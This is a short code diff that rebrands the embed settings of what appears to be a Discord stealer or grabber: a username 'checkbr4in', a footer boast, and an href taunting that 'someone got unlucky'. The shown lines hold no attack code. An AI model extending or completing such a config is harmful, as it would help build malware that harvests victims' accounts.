@@ -26,7 +26,7 @@ var config = {
 
         username: "checkbr4in",
         footer: {
-            text: `Archimedes`,
+            text: `checkbr4in dominates them`,
             icon_url: "https://media.discordapp.net/attachments/1026908200575963156/1060756220333535293/1672962713.png",
         },
         href: "Someone got unlucky lol",
